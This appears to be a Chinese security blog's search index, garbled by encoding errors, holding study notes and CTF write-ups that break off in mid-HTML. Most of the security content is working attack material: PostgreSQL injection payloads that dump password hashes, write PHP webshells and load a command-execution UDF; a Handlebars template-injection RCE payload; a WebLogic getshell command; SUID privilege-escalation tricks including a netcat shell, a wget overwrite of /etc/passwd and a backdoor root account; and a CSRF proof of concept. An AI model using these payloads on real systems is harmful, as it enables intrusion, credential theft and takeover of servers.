&lt;url-pattern&gt;å£°æ˜æµè§ˆå™¨è®¿é—®çš„è·¯å¾„&lt;/url-pattern&gt;&lt;servlet-mapping&gt; è€Œåœ¨Servlet3.0ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œweb.xmlå¯ä»¥é…ç½®çš„servletå±æ€§ï¼Œéƒ½å¯ä»¥é€šè¿‡@WebServletçš„æ–¹å¼è¿›è¡Œé…ç½® æ¥å£æ–¹æ³•init():åˆå§‹åŒ–å¯¹è±¡service():æ‰§è¡Œå®é™…ä»»åŠ¡çš„ä¸»è¦æ–¹æ³•doget()/dopost()destory()æ¥å£ï¼šé‡Šæ”¾èµ„æº java webè¿‡æ»¤å™¨â€”â€”filterfilteræ˜¯Servlet2.3æ–°å¢çš„ä¸€ä¸ªç‰¹æ€§ï¼Œèƒ½å¤Ÿå®ç°å¯¹æ‰€æœ‰webèµ„æºçš„ç®¡ç†ï¼Œå®ç°æƒé™è®¿é—®æ§åˆ¶ï¼Œè¿‡æ»¤æ•æ„Ÿè¯æ±‡ï¼Œå‹ç¼©å“åº”ä¿¡æ¯ç­‰ä¸€äº›é«˜çº§åŠŸèƒ½ é…ç½®æ–¹å¼:1.åŸºäºweb.xml 2.åŸºäºæ³¨è§£æ–¹å¼ æ³¨æ„ï¼šä½¿ç”¨æ³¨è§£æ–¹å¼é…ç½®filterï¼Œæ— æ³•ç¡®å®šè¿‡æ»¤å™¨çš„æ‰§è¡Œé¡ºåº filterå®ç°æµç¨‹ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€requestè¯·æ±‚ï¼ŒæœåŠ¡å™¨æ¥æ”¶æ”¹è¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚æŒ‰æ¬¡åºå‘é€åˆ°filterä¸­è¿›è¡Œå¤„ç†ï¼Œæœ€åè°ƒç”¨servletä¸­çš„service()æ–¹æ³•ï¼Œè°ƒç”¨å®Œæ¯•åï¼ŒæŒ‰ç…§ä¸è¿›å…¥æ—¶ç›¸åçš„é¡ºåºè°ƒç”¨filterè¿”å›ç»™æœåŠ¡å™¨ï¼Œæœ€ç»ˆè¿”å›ç»™ç”¨æˆ·ã€‚","link":"/2022/02/21/java%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"},{"title":"nodejs-expresså¼€å‘","text":"1.å…¨å±€å®‰è£…expressæ¡†æ¶,cmdæ‰“å¼€å‘½ä»¤è¡Œ,è¾“å…¥å¦‚ä¸‹å‘½ä»¤: npm install -g express express 4.xç‰ˆæœ¬ä¸­å°†å‘½ä»¤å·¥å…·åˆ†å‡ºæ¥,å®‰è£…ä¸€ä¸ªå‘½ä»¤å·¥å…·,æ‰§è¡Œå‘½ä»¤: npm install -g express-generator è¾“å…¥express --versionéªŒè¯ 2.å¦‚æœåœ¨æ‰§è¡Œjsæ–‡ä»¶ä»æŠ¥Error: Cannot find module expressé”™è¯¯ã€‚ è§£å†³åŠæ³•ï¼š åœ¨è‡ªå·±çš„å·¥ç¨‹ç›®å½•ä¸‹å†æ¬¡æ‰§è¡Œ: npm install expressâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œmlsamaã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/mlsama/article/details/80211033","link":"/2022/02/07/nodejs-express%E5%BC%80%E5%8F%91/"},{"title":"postgresqlæ³¨å…¥","text":"å‰è¨€æ€»ç»“ä¸€ä¸‹ä¸€äº›æ³¨å…¥å§¿åŠ¿ åŸºç¡€è¯­æ³•1.Postgres éƒ½æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ \\h #æŸ¥çœ‹æ‰€æœ‰çš„sqlå…³é”®å­—\\? #å‘½ä»¤è¡Œæ“ä½œçš„å¸®åŠ©\\d #æŸ¥çœ‹å½“å‰schema ä¸­æ‰€æœ‰çš„è¡¨\\q #é€€å‡ºpgå‘½ä»¤è¡Œ\\d #schema.table æŸ¥çœ‹è¡¨çš„ç»“æ„\\x #æ¨ªçºµæ˜¾ç¤ºåˆ‡æ¢\\dT+ #æ˜¾ç¤ºæ‰©å±•ç±»å‹ç›¸å…³å±æ€§åŠæè¿°\\l #åˆ—å‡ºæ‰€æœ‰çš„æ•°æ®åº“\\timing #æ˜¾ç¤ºæ‰§è¡Œæ—¶é—´\\c database_name #åˆ‡æ¢æ•°æ®åº“set search to schema #åˆ‡æ¢schemaexplain sql #è§£é‡Šæˆ–åˆ†æsqlæ‰§è¡Œè¿‡ç¨‹ æ•°æ®åº“ä¹‹é—´çš„è¯­è¨€åŸºæœ¬éƒ½æ˜¯é€šç”¨çš„ï¼ŒæŸ¥è¯¢çš„æ—¶å€™é‡ç‚¹å…³æ³¨çš„è¿˜æ˜¯ä¸€äº›åº“çš„ä¸åŒï¼Œä¾‹å¦‚current_database(),åƒlikeè¿™äº›ä¹Ÿæ˜¯é€šç”¨çš„s æ³¨å…¥ç‚¹æµ‹è¯•ä»¥åŠæ³¨å…¥æ–¹æ³•postgresqlçš„æ³¨å…¥ç‚¹å¯èƒ½ä¼šä½äºä¸åŒå­—å¥å†… selectå¦‚æœå‚æ•°æ˜¯æ•´æ•°ï¼špg_sleep(20); -- -å¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼š'||pg_sleep(20); -- - æ³¨å…¥æ–¹æ³•ï¼š 1' UNION SELECT 'a';-- -' union'||password FROM users; -- -'; æˆ‘ä»¬çŸ¥é“ä¸€èˆ¬å›æ˜¾çš„æ˜¯ç¬¬ä¸€åˆ—ï¼Œæ‰€ä»¥åªéœ€è¦è®©ç¬¬ä¸€åˆ—ä¸å­˜åœ¨å°±è¡Œäº† fromæµ‹è¯•è¯­å¥: æ•°å­—:(SELECT * FROM [TABLE] WHERE [COLUMN]=1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))&lt;&gt;0 THEN 1 ELSE 2 END))) ss; -- -å­—ç¬¦ä¸²ï¼š(SELECT * FROM [TABLE] WHERE [COLUMN] = 'asd'::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))&lt;&gt;0 THEN 1 ELSE 2 END))) ss; -- - æ³¨å…¥è¯­å¥ä¸º (SELECT * FROM address WHERE address=''||(SELECT CASE WHEN (SELECT COUNT((SELECT username FROM staff WHERE username SIMILAR TO 'M%')))&lt;&gt;0 THEN pg_sleep(20) ELSE '' END)) ss; -- -; æœ€ç»ˆæ•ˆæœä¸ºï¼š SELECT address FROM (SELECT * FROM address WHERE address=''||(SELECT CASE WHEN (SELECT COUNT((SELECT username FROM staff WHERE username SIMILAR TO 'M%')))&lt;&gt;0 THEN pg_sleep(20) ELSE '' END)) ss; -- -; æ ¹æ®SELECT username FROM staff WHERE username SIMILAR TO 'M%'è¿”å›çš„å†…å®¹ä¸å¦ï¼Œå®ƒä¼šä¼‘çœ 20ç§’ï¼Œæˆ–è€…ä»€ä¹ˆä¹Ÿä¸åšã€‚å¯ä»¥é€å­—èŠ‚fuzzæ•°æ®ã€‚ order byæ³¨å…¥ç‚¹æµ‹è¯•ï¼šæ˜¯å¦å»¶æ—¶ (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))&lt;&gt;0 THEN true ELSE false END); -- - åˆ©ç”¨order byçš„trueæˆ–è€…false (SELECT CASE WHEN COUNT((SELECT (SELECT CASE WHEN COUNT((SELECT username FROM staff WHERE username SIMILAR TO 'M%'))&lt;&gt;0 THEN pg_sleep(20) ELSE '' END)))&lt;&gt;0 THEN true ELSE false END); -- - å¦‚æœç¬¬ä¸€ä¸ªCOUNTå‡½æ•°æ²¡æœ‰è¿”å›é›¶ï¼Œé‚£ä¹ˆå¯¹äºORDER BYï¼Œæˆ‘ä»¬å¾—åˆ°æœ€ç»ˆçš„trueæˆ–falseã€‚ æ­£ç¡®æˆ–é”™è¯¯å–å†³äºå†…éƒ¨é€‰æ‹©(ç¬¬äºŒä¸ªæŸ¥è¯¢æ˜¯æ ¸å¿ƒåˆ¤æ–­çš„)ã€‚ å†…éƒ¨é€‰æ‹©å°†ä¼‘çœ 20ç§’ï¼Œæˆ–è€…ä»€ä¹ˆä¹Ÿä¸è¿”å›ã€‚ è¿™å–å†³äºäººå‘˜è¡¨ä¸­ç”¨æˆ·çš„é¦–å­—æ¯æ˜¯å¦ä»¥Må¼€å¤´ï¼ˆè¿™æ˜¯SELECT username FROM staff WHERE username SIMILAR TO 'M%'éƒ¨åˆ†ï¼‰ã€‚ HAVINGæ³¨å…¥ç‚¹æµ‹è¯• å¦‚æœparameteræ˜¯æ•´æ•°ï¼š(COUNT((SELECT pg_sleep(20)))=1); -- -å¦‚æœparameteræ˜¯å­—ç¬¦ä¸²ï¼št' AND (SELECT COUNT((SELECT pg_sleep(20)))) = 1; -- - æ­¤å‚æ•°æ¥å—ä¸€ä¸ªæ¡ä»¶ï¼Œå› æ­¤æˆ‘æ·»åŠ äº†ä¸€ä¸ªANDè¿ç®—ç¬¦ä»¥ä½¿ä¹‹å¿…é¡»éƒ½ä¸ºçœŸï¼Œç„¶åæ·»åŠ äº†æ¡ä»¶ï¼Œè¯¥æ¡ä»¶å°†ä½¿æˆ‘ä»¬å¯ä»¥é€å­—èŠ‚å¯¹å€¼è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ t' AND (SELECT COUNT((SELECT password FROM staff WHERE password SIMILAR TO '8%' LIMIT 1))) = 1; -- - åŒæ ·ï¼Œå¦‚æœæœªæ˜¾ç¤ºè¾“å‡ºï¼Œåˆ™å¯ä»¥ä½¿pg_sleepï¼ˆï¼‰å‡½æ•°çš„å¤§éƒ¨åˆ†æ—¶é—´ç¡çœ ï¼ˆå¦‚æœä¸ºtrueï¼‰20ç§’é’Ÿï¼Œå¹¶ä½¿ç”¨å®ƒæ¥ç¡®å®šæ¡ä»¶è¾“å‡ºã€‚ å†…ç½®å‡½æ•°current_database() //å½“å‰æ•°æ®åº“åsession_user //ä¼šè¯ç”¨æˆ·current_user //å½“å‰æ•°æ®åº“ç”¨æˆ·user //å½“å‰ç”¨æˆ·version() //æ•°æ®åº“ç‰ˆæœ¬ æ³¨å…¥è¿‡ç¨‹çˆ†åº“ and 1=2 union select (select current_database()),null,null-- è·å–è¡¨åï¼Œå­—æ®µå and 1=2 union select table_name,null,null from information_schema.tables limit 1 offset n--and 1=2 union select column_name,null,null from information_schema.columns where table_name='admin' limit 1 offset n--(è€ç‰ˆæœ¬)pg_class.oidå¯¹åº”pg_attribute.attrelidpg_class.relnameè¡¨åpg_attribute.attnameå­—æ®µåselect relname from pg_classè·å–è¡¨åselect oid from pg_class wehre relname='admin'è·å–è¡¨çš„oidselect attname from pg_attribute where attrelid='oidçš„å€¼' è·å–å­—æ®µå è·å–æ•°æ® nd 1=2 union select username||chr(124)||passwd,null,null from pg_shadow limit 1 offset 0--çˆ†æ•°æ®åº“ç”¨æˆ·å¯†ç  è¯»å†™æ–‡ä»¶è€ç‰ˆæœ¬å†™æ–‡ä»¶:create table beach(shell text)insert into beach values('&lt;?php eval($_POST[c])?&gt;')copy beach(shell) to '/var/www/html/shell.php'drop table beach#PS:copy (select '&lt;?php eval($_POST[c])?&gt;') to '/var/www/html/shell.php'è€ç‰ˆæœ¬è¯»æ–‡ä»¶:create table beach(shell text)copy beach(shell) from '/etc/passwd'select * from beach limit 1 offset nè¯»æ¯ä¸€è¡Œå®æˆ˜:ç™»å…¥å:sql&gt;select '&lt;%execute request(&quot;v&quot;)%&gt;';sql&gt;\\o c:\\\\wwwroot\\\\1.aspURLæ‰§è¡Œ:id=1;copy (select '&lt;?php eval($_POST[c])?&gt;') to '/var/www/html/shell.php'æ–°ç‰ˆæœ¬:pg_file_write(filename,text,bool)pg_read_file(filename,pos,length)pg_ls_dir(dirname)ç»•è¿‡è½¬ä¹‰: GPC=Onæ—¶å€™ ç”¨$quote$ä»£æ›¿å•å¼•å·å¦‚:select pwd from admin wehre user='beach'æˆ:select pwd from admin where user=$x$beach$x$ ç»•è¿‡/**/ = &quot; &quot;;-- - å¿½ç•¥å°¾éšæ•°æ® è¿‡æ»¤å¼•å·ä½¿ç”¨$ç¬¦å· select $$test$$ == SELECT $quote$test$quote$; == select 'test' åœ¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ—¶å€™é‡‡å–CHR()å‡½æ•°: SELECT CHR(65)||CHR(66)||CHR(67)||CHR(68)||CHR(69)||CHR(70)||CHR(71)||CHR(72);ç­‰æ•ˆäºSELECT 'ABCDEFGH'; å‘½ä»¤æ‰§è¡Œ1.åˆ©ç”¨ libc ä¸­çš„ system() å‡½æ•°2.åˆ©ç”¨Perl/Pythonè„šæœ¬è¯­è¨€åŠŸèƒ½3.åˆ©ç”¨Cè¯­è¨€è‡ªå®šä¹‰å‡½æ•°æŸ¥çœ‹Postgresqlç›®å½• SELECT setting FROM pg_settings WHERE name='data_directory'; æŸ¥è¯¢oid select lo_creat(-1); oidä¸ä¸Šé¢ä¿æŒä¸€è‡´; delete from pg_largeobject where loid=18412; æŠŠåå…­è¿›åˆ¶çš„soæ–‡ä»¶å¯¼å…¥ insert into pg_largeobject (loid,pageno,data) values(18412, 0, decode('7F454CXXXXXXXXX000', 'hex')); //è¿™é‡Œç•¥å†™äº†åå…­è¿›åˆ¶soæ–‡ä»¶çš„å®Œæ•´å†…å®¹ åˆ©ç”¨postgresqlè‡ªå¸¦å‡½æ•°å°†å¤§å‹å¯¹è±¡å¯¼å‡ºåˆ°æ–‡ä»¶ SELECT lo_export(18412, 'cmd.so'); å»ºç«‹UDF CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/xxx/cmd.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE; è°ƒç”¨udf select sys_eval('id');","link":"/2022/02/07/postgresql%E6%B3%A8%E5%85%A5/"},{"title":"ä½¿ç”¨dockerå‡ºé¢˜","text":"","link":"/2022/02/10/%E4%BD%BF%E7%94%A8docker%E5%87%BA%E9%A2%98/"},{"title":"åŒºå—é“¾ç†è®ºå­¦ä¹ ","text":"æ•°æ®é“¾å’ŒèŠ‚ç‚¹é“¾æ•°æ®é“¾æŒ‡ç”¨é“¾å¼ç»“æ„ç»„ç»‡åŒºå—æ•°æ®ï¼Œæ„æˆæ•°æ®æ ¡éªŒå’Œè¿½æº¯çš„é“¾æ¡ï¼›â€œèŠ‚ç‚¹é“¾â€æŒ‡å¤šä¸ªèŠ‚ç‚¹é€šè¿‡ç½‘ç»œè¿æ¥åœ¨ä¸€èµ·ï¼Œäº’ç›¸å…±äº«ä¿¡æ¯ï¼Œå…¶ä¸­çš„å…±è¯†èŠ‚ç‚¹åˆ™è”åˆæ‰§è¡Œå…±è¯†ç®—æ³•ï¼Œäº§ç”Ÿå¹¶ç¡®è®¤åŒºå—ã€‚ é’ˆå¯¹æº¯æºæœºåˆ¶æ¥è¯´ï¼Œç”Ÿäº§å•†ï¼Œè¿è¾“å•†å°±ç›¸å½“äºèŠ‚ç‚¹é“¾ï¼Œè€Œéœ€è¦ä¸Šé“¾çš„æ•°æ®åˆ™æ˜¯é’ˆå¯¹æ•°æ®é“¾è€Œè¨€ï¼Œå¹¶ä¸”æ•°æ®ä¸Šé“¾å³ä¸ºäº¤æ˜“ä¸Šé“¾ äº¤æ˜“â€œä¸Šé“¾â€çš„ç®€è¦è¿‡ç¨‹å¦‚ä¸‹ï¼š è®°è´¦è€…ä»¬æ”¶å½•äº¤æ˜“ï¼ŒæŒ‰é“¾å¼æ•°æ®ç»“æ„æ‰“åŒ…æˆâ€œåŒºå—â€ã€‚ å…±è¯†ç®—æ³•é©±åŠ¨å¤§å®¶éªŒè¯æ–°åŒºå—é‡Œçš„äº¤æ˜“ï¼Œç¡®ä¿è®¡ç®—å‡ºä¸€è‡´çš„ç»“æœã€‚ æ•°æ®è¢«å¹¿æ’­åˆ°æ‰€æœ‰èŠ‚ç‚¹ï¼Œç¨³å¦¥å­˜å‚¨ä¸‹æ¥ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šå­˜å‚¨ä¸€ä¸ªå®Œæ•´çš„æ•°æ®å‰¯æœ¬ã€‚ å…±è¯†æœºåˆ¶â€œå…±è¯†æœºåˆ¶â€ï¼Œæ˜¯é€šè¿‡ç‰¹æ®ŠèŠ‚ç‚¹çš„æŠ•ç¥¨ï¼Œåœ¨å¾ˆçŸ­çš„æ—¶é—´å†…å®Œæˆå¯¹äº¤æ˜“çš„éªŒè¯å’Œç¡®è®¤ï¼›å¯¹ä¸€ç¬”äº¤æ˜“ï¼Œå¦‚æœåˆ©ç›Šä¸ç›¸å¹²çš„è‹¥å¹²ä¸ªèŠ‚ç‚¹èƒ½å¤Ÿè¾¾æˆå…±è¯†ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¤ä¸ºå…¨ç½‘å¯¹æ­¤ä¹Ÿèƒ½å¤Ÿè¾¾æˆå…±è¯†ã€‚ æ™ºèƒ½åˆçº¦æ™ºèƒ½åˆçº¦æ˜¯ä¸€ç§ç‰¹æ®Šåè®®ï¼Œæ—¨åœ¨æä¾›ã€éªŒè¯åŠæ‰§è¡Œåˆçº¦ã€‚å…·ä½“æ¥è¯´ï¼Œæ™ºèƒ½åˆçº¦æ˜¯åŒºå—é“¾è¢«ç§°ä¹‹ä¸ºâ€œå»ä¸­å¿ƒåŒ–çš„â€é‡è¦åŸå› ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨ä¸éœ€è¦ç¬¬ä¸‰æ–¹çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œå¯è¿½æº¯ã€ä¸å¯é€†è½¬å’Œå®‰å…¨çš„äº¤æ˜“ã€‚ æ™ºèƒ½åˆçº¦æ˜¯æ‰§è¡Œâ€œå¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µå°±æ‰§è¡Œé‚£ç§ç»“æœâ€çš„å°ç¨‹åºï¼Œç”±å¤§é‡è®¡ç®—æœºè¿è¡Œå¹¶éªŒè¯ä»¥ç¡®ä¿å¯ä¿¡ã€‚","link":"/2022/02/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/"},{"title":"2021ä¸œåæ¯","text":"å‰è¨€æ¯”èµ›é‚£å¤©ä½“ä¾§==äººå‚»äº†ï¼Œåé¢ä¹Ÿæ²¡å¿ƒæƒ…åšï¼Œä½†æ˜¯æ„Ÿè§‰æ¯”èµ›çš„é¢˜éƒ½æ˜¯å¯ä»¥å­¦ä¹ çš„ï¼Œå¯æƒœæ²¡æƒ³åˆ°ç¯å¢ƒé©¬ä¸Šå°±å…³äº†â€“ apacheprOxyé™„è¿‘æ˜¯ä¸€ä¸ªdockeræ–‡ä»¶ï¼Œå‘ç°æ˜¯GKCTF2021çš„åŸé¢˜ï¼ˆç®€åŒ–ç‰ˆï¼‰,è¿™é‡Œä¸»è¦å­¦ä¹ ä¸€ä¸‹å­¦é•¿çš„å·¥å…·è¯•è¯•çœ‹ é¦–å…ˆä½¿ç”¨æ‰«æå™¨æ‰«æé“¾æ¥ python3 ws.py -t xx.xx.xx.xx ç„¶åä½¿ç”¨å·¥å…·ä¸€é”®getshell python cve-2020-14882_rce.py -u http://127.0.0.1:7001 -c whoami eznodeçœ‹çœ‹èƒ½ä¸èƒ½æœ¬åœ°èµ·ä¸€ä¸ªè·‘ä¸€ä¸‹çœ‹çœ‹é…ç½®è¿‡ç¨‹ï¼Œé¦–å…ˆå‡ºç°äº†ç¬¬ä¸€ä¸ªé—®é¢˜: 'const' is available in ES6 (use 'esversion: 6') or Mozilla JS extensions (use moz). (W104) æŸ¥åˆ°è§£å†³æ–¹æ³•æ˜¯:åœ¨å¼€å¤´æ·»åŠ ä¸€ä¸ª /*jshint esversion: 6 */ ç„¶åä¸€ç›´è¯´æ‰¾ä¸åˆ°moduleï¼Œinstalläº†å¾ˆå¤šæ¬¡ï¼Œå‘ç°éœ€è¦cdåˆ°é‚£ä¸ªé¡¹ç›®ç›®å½•ä¸‹å»installè¿™äº›æ¨¡å— npm install ç”±äºå‰é¢çš„ç™»å½•éƒ¨åˆ†éœ€è¦éº»çƒ¦çš„æ•°æ®åº“ä¹‹ç±»çš„é…ç½®ï¼Œæ‰€ä»¥æˆ‘å°±ç›´æ¥è¿›å…¥åˆ°uploadçš„è·¯ç”±ï¼Œå¹¶åˆ é™¤æ ¡éªŒçš„éƒ¨åˆ†äº†æŸ¥çœ‹package.jsonï¼Œä¸€ä¸ªä¸€ä¸ªæŸ¥æ¼æ´ï¼ˆç§¯ç´¯ä¸‹ï¼‰ { &quot;name&quot;: &quot;app&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;private&quot;: true, &quot;scripts&quot;: { &quot;start&quot;: &quot;node ./bin/www&quot;, &quot;dev&quot;: &quot;nodemon index.js -e js&quot; }, &quot;dependencies&quot;: { &quot;cookie-parser&quot;: &quot;~1.4.4&quot;, &quot;crypto&quot;: &quot;^1.0.1&quot;, &quot;debug&quot;: &quot;~2.6.9&quot;, &quot;express&quot;: &quot;~4.16.1&quot;, &quot;hbs&quot;: &quot;^4.0.1&quot;, &quot;http-errors&quot;: &quot;~1.6.3&quot;, &quot;morgan&quot;: &quot;~1.9.1&quot;, &quot;multer&quot;: &quot;^1.4.3&quot;, &quot;mysql&quot;: &quot;^2.18.1&quot;, &quot;path&quot;: &quot;^0.12.7&quot;, &quot;sequelize&quot;: &quot;^6.7.0&quot; }} å‘ç°hbsçš„æ¨¡æ¿æ¸²æŸ“æœ‰ä¸€ä¸ªCVE-2021-32822å‚è€ƒæ–‡ç« :https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs {{#with &quot;s&quot; as |string|}} {{#with &quot;e&quot;}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub &quot;constructor&quot;)}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push &quot;return require('child_process').exec('whoami');&quot;}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}}{{/with}} {{#with &quot;s&quot; as |string|}} {{#with &quot;e&quot;}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub &quot;constructor&quot;)}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push &quot;return process.mainModule.require('child_process').execSync('cat /flag').toString();&quot;}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}}{{/with}} OldLibraryè¿™é‡Œå°±è®°å½•ä¸€ä¸‹ Linux SUID ææƒå…³äºsuidsuidæ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§æƒé™å…·ä½“å™è¿°å¯ä»¥å‚è€ƒ:https://www.cnblogs.com/sparkdev/p/9651622.htmlæ€»ç»“æ¥è¯´å°±æ˜¯:å½“ä¸€ä¸ªäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶å…·æœ‰suidæƒé™æ—¶ï¼Œå°½ç®¡ä¸æ˜¯rootç”¨æˆ·ä¹Ÿå¯ä»¥æ‰§è¡Œæœ¬è¯¥rootç”¨æˆ·æ‰èƒ½æ‰§è¡Œçš„åŠŸèƒ½ æŸ¥æ‰¾suidæƒé™ä½æ–‡ä»¶ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°æ­£åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ã€‚å‡†ç¡®çš„è¯´ï¼Œè¿™ä¸ªå‘½ä»¤å°†ä»/ç›®å½•ä¸­æŸ¥æ‰¾å…·æœ‰SUIDæƒé™ä½ä¸”å±ä¸»ä¸ºrootçš„æ–‡ä»¶å¹¶è¾“å‡ºå®ƒä»¬ï¼Œç„¶åå°†æ‰€æœ‰é”™è¯¯é‡å®šå‘åˆ°/dev/nullï¼Œä»è€Œä»…åˆ—å‡ºè¯¥ç”¨æˆ·å…·æœ‰è®¿é—®æƒé™çš„é‚£äº›äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} ; ä¹Ÿå¯ä»¥ä½¿ç”¨ sudo -l å‘½ä»¤åˆ—å‡ºå½“å‰ç”¨æˆ·å¯æ‰§è¡Œçš„å‘½ä»¤ å¸¸ç”¨ææƒæ–¹å¼nmapï¼ˆ2.02-5.21ï¼‰å­˜åœ¨äº¤æ¢æ¨¡å¼ï¼Œå¯åˆ©ç”¨ææƒ nmap --interactive ä¹‹åæ‰§è¡Œ: nmap&gt; !shsh-3.2# whoamiroot msfä¸­çš„æ¨¡å—ä¸ºï¼š exploit/unix/local/setuid_nmap è¾ƒæ–°ç‰ˆå¯ä½¿ç”¨ --script å‚æ•°ï¼š echo &quot;os.execute('/bin/sh')&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse findtouch testfind test -exec whoami \\; nc åå¼¹ shellï¼š find test -exec netcat -lvp 5555 -e /bin/sh \\; 2.3 vi/vimæ‰“å¼€vim,æŒ‰ä¸‹ESC :set shell=/bin/sh:shell æˆ–è€… sudo vim -c '!sh' 2.4 bashbash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(service) 2.5 lessless /etc/passwd!/bin/sh 2.6 moremore /home/pelle/myfile!/bin/bash 2.7 cpè¦†ç›– /etc/shadow æˆ– /etc/passwd [zabbix@localhost ~]$ cat /etc/passwd &gt;passwd2.[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack1233.$1$hack$WTn0dk2QjNeKfl.DHOUue04.[zabbix@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' &gt;&gt; passwd5.[zabbix@localhost ~]$ cp passwd /etc/passwd6.[zabbix@localhost ~]$ su - hack7.Password:8.[root@361way ~]# id9.uid=0(hack) gid=0(root) groups=0(root)10.[root@361way ~]# cat /etc/passwd|tail -111.hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash 2.8 mvè¦†ç›– /etc/shadow æˆ– /etc/passwd 2.9 nanonano /etc/passwd 2.10 awkawk 'BEGIN {system(&quot;/bin/sh&quot;)}' 2.11 manman passwd!/bin/bash 2.12 wgetwget http://192.168.56.1:8080/passwd -O /etc/passwd 2.13 apacheä»…å¯æŸ¥çœ‹æ–‡ä»¶ï¼Œä¸èƒ½å¼¹ shellï¼š apache2 -f /etc/shadow 2.14 tcpdumpecho $'id\\ncat /etc/shadow' &gt; /tmp/.testchmod +x /tmp/.testsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root 2.15 python/perl/ruby/lua/php/etcpython python -c &quot;import os;os.system('/bin/bash')&quot; perl exec &quot;/bin/bash&quot;; å°±æµ‹è¯•äº†ä¸€ä¸‹viçš„ï¼Œå‘ç°è¿˜æŒºç¥å¥‡çš„ åŸä½œè€…ç”¨å¾—æ˜¯ find / -perm -u=s -type f 2&gt;/dev/null #æŸ¥æ‰¾ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶comm /flagggisshere /dev/null 2&gt; /dev/null å‚è€ƒï¼šhttp://www.snowywar.top/?p=2743","link":"/2021/11/01/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF-suid%E6%8F%90%E6%9D%83/"},{"title":"2021å®‰æ´µæ¯","text":"","link":"/2022/03/03/2021%E5%AE%89%E6%B4%B5%E6%9D%AF-1/"},{"title":"2022SUSCTF","text":"fxxkcorsCSRFé¢˜ç›®ï¼Œä½†æ˜¯ä¹‹å‰æ²¡åšè¿‡ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼Œå¤§æ¦‚æ€è·¯å°±æ˜¯é€šè¿‡è®©robotsè®¿é—®è¿™ä¸ªè¡¨å•ï¼Œç„¶åå°±å¯ä»¥æå‡æƒé™ &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action=&quot;http://124.71.205.122:10002/changeapi.php&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt; &lt;input type=&quot;hidden&quot; name='{&quot;username&quot;:&quot;skr&quot;,&quot;test&quot;:&quot;' value='&quot;}' /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; ez_noteè·³è½¬ç±»å‹ XS-Leaks https://xsleaks.dev/docs/attacks/navigations/ &lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;robots&quot; content=&quot;noindex&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; 